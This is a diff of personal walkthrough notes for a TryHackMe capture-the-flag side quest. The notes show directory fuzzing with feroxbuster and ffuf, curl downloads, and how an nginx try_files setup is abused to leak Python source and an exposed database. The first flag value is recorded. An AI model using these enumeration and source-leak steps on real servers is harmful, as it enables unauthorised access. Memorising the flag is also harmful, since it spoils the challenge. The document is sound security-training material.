@@ -4,13 +4,14 @@
 
 |================================================================
 - Name: 
-- IP Address: 10.65.162.239
+- IP Address: 10.65.166.164
 - OS: 
 - Notes: 
 
 //CREDS:
 
 //Flags:
+	THM{eggsposed_source_code}
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -34,10 +35,13 @@ throne123*
 ## Introduction
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 ### Hopper the Detective
-When Sir BreachBlocker is captured, Hopper senses an opportunity: the last key to the stolen AoC charity funds is hidden somewhere on Sir BreachBlocker’s seized phone.
-The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
+//When Sir BreachBlocker is captured, Hopper senses an opportunity: the last key to the stolen AoC charity funds is hidden somewhere on Sir BreachBlocker’s seized phone.
 
-ip=10.65.162.239
+//The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
+
+ip=10.65.166.164
+
+//This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.
 
 Visit: firefox-esr http://$ip:21337/
 Memory Key: throne123*
@@ -88,6 +92,133 @@ PORT   STATE         SERVICE
 68/udp open|filtered dhcpc
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 8443/tcp	ssl/http nginx 1.29.3
+//https://$ip:8443/
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Checking the HTTPS server on port 8443, we see an emulated mobile phone interface with the Hopflix and Hopsec Bank applications. However, both applications require credentials, which we do not have at this stage.
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+feroxbuster -k -u https://$ip:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx,py,conf -o feroxbuster_8443.out
+
+200  https://10.65.166.164:8443/main.js
+200  https://10.65.166.164:8443/selfie.png
+200  https://10.65.166.164:8443/breaky.png
+200  https://10.65.166.164:8443/wallpaper.png
+200  https://10.65.166.164:8443/
+200  https://10.65.166.164:8443/index.html
+401  https://10.65.166.164:8443/api/get-last-viewed
+200  https://10.65.166.164:8443/hopflix-874297.db
+200  https://10.65.166.164:8443/main.py
+200  https://10.65.166.164:8443/requirements.txt
+
+
+feroxbuster -k -u https://$ip:8443/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
+
+200  https://10.65.166.164:8443/breaky.png
+200  https://10.65.166.164:8443/main.js
+200  https://10.65.166.164:8443/wallpaper.png
+200  https://10.65.166.164:8443/selfie.png
+200  https://10.65.166.164:8443/
+200  https://10.65.166.164:8443/nginx.conf
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Grab WebFiles
+curl -k https://10.65.166.164:8443/main.js -o main.js
+curl -k https://10.65.166.164:8443/index.html -o index.html
+curl -k https://10.65.166.164:8443/requirements.txt -o requirements.txt
+curl -k https://10.65.166.164:8443/nginx.conf -o nginx.conf
+curl -k https://10.65.166.164:8443/main.py -o main.py
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// First Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+We do not get much from the phone interface, apart from seeing it connect to several API endpoints. Instead, by fuzzing the application with quickhits.txt, we can discover the nginx.conf file.
+
+ffuf -u 'https://10.65.166.164:8443/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 100 -mc all -ic -fc 404
+
+//NOTE:
+-mc all
+	Match all HTTP status codes
+
+-ic
+	Ignore wordlist case
+
+-fc 404
+	Filter out HTTP 404 responses
+	Removes “Not Found” noise
+
+
+// nginx.conf
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+curl -k https://10.65.166.164:8443/nginx.conf
+
+user  nginx;
+worker_processes 4;
+error_log  /var/log/nginx/error.log warn;
+pid        /var/run/nginx.pid;
+events {
+    worker_connections 2048;
+}
+http {
+    include       /etc/nginx/mime.types;
+    default_type  application/octet-stream;
+    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
+                      '$status $body_bytes_sent "$http_referer" '
+                      '"$http_user_agent" "$http_x_forwarded_for"';
+    access_log  /var/log/nginx/access.log  main;
+    sendfile        on;
+    keepalive_timeout  300;
+    server {
+        listen 443 ssl http2;
+        ssl_certificate /app/server.cert;
+        ssl_certificate_key /app/server.key;
+        ssl_protocols TLSv1.2;
+        location / {
+            try_files $uri @app;
+        }
+        location @app {
+            include uwsgi_params;
+            uwsgi_pass unix:///tmp/uwsgi.sock;
+        }
+    }
+}
+daemon off;
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//One directive immediately stands out: try_files. This tells Nginx to first check whether the requested URI exists as a file on disk and serve it directly. Only if the file does not exist is the request forwarded to the uWSGI backend.
+
+//Interesting code above:
+	location / {
+    	try_files $uri @app;
+	}
+
+//We can abuse this behavior to read files from the web application directory, including source code. Since we know this is a Python application, we try common filenames such as app.py and hello.py. This succeeds with main.py, allowing us to leak the application source code and capture the first flag.
+
+
+//THM{eggsposed_source_code}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Second Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//The leaked source code also references two database files: hopflix-874297.db and hopsecbank-12312497.db. Attempting to retrieve them shows that hopsecbank-12312497.db does not exist in the web root, but hopflix-874297.db does.
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
